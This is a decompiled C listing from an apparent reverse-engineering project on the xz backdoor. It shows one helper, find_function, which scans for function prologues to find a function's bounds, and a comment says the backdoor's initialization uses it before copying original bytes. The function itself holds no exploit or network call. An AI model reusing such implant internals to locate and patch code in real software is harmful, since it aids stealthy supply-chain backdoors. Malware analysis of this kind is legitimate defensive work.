// /home/kali/xzre-ghidra/xzregh/100BA0_find_function.c
// Function: find_function @ 0x100BA0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall find_function(u8 * code_start, void * * func_start, void * * func_end, u8 * search_base, u8 * code_end, FuncFindType find_mode)
/*
 * AutoDoc: Combines the prologue scan with a forward sweep to determine both the start and end addresses of a function. Backdoor initialization relies on it when it needs exact bounds for copying original bytes or scheduling follow-up pattern searches.
 */

#include "xzre_types.h"


BOOL find_function(u8 *code_start,void **func_start,void **func_end,u8 *search_base,u8 *code_end,
                  FuncFindType find_mode)

{
  BOOL BVar1;
  BOOL found_2;
  BOOL found;
  BOOL found_1;
  u8 *p;
  u8 *search_from;
  u8 *local_40 [2];
  u8 *search_to;
  
  local_40[0] = (u8 *)0x0;
  search_from = code_start;
  if (func_start != (void **)0x0) {
    while ((search_base < search_from &&
           (BVar1 = find_function_prologue(search_from,code_end,local_40,find_mode), BVar1 == 0))) {
      search_from = search_from + -1;
    }
    search_to = local_40[0];
    if ((local_40[0] == (u8 *)0x0) ||
       ((local_40[0] == search_base &&
        (found_2 = find_function_prologue(search_base,code_end,(u8 **)0x0,find_mode), found_2 == 0))
       )) {
      return 0;
    }
    *func_start = search_to;
  }
  p = code_start + 1;
  if (func_end != (void **)0x0) {
    for (; p < code_end + -4; p = p + 1) {
      found = find_function_prologue(p,code_end,(u8 **)0x0,find_mode);
      if (found != 0) goto LAB_00100c78;
    }
    if ((code_end + -4 != p) ||
       (found_1 = find_function_prologue(p,code_end,(u8 **)0x0,find_mode), found_1 != 0)) {
LAB_00100c78:
      code_end = p;
    }
    *func_end = code_end;
  }
  return 1;
}

